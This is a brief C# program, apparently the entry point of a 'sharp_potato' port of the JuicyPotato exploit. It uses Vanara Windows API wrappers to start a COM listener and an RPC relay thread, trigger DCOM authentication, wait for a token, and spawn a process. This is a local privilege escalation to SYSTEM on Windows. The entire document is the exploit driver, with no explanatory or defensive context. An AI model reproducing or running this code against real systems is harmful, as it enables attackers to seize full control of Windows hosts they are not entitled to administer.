using System.Text;
using sharp_potato;
using Vanara.InteropServices;
using Vanara.PInvoke;
using static Vanara.PInvoke.Ole32;
using static Vanara.PInvoke.AdvApi32;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.Secur32;

var potato = new JuicyPotato();
potato.startCOMListenerThread();

Console.Out.WriteLine("Trying CLSID...");

potato.startRPCConnectionThread();
potato.TriggerDCOM();

potato.WaitForAuth();

potato.CreateProcess();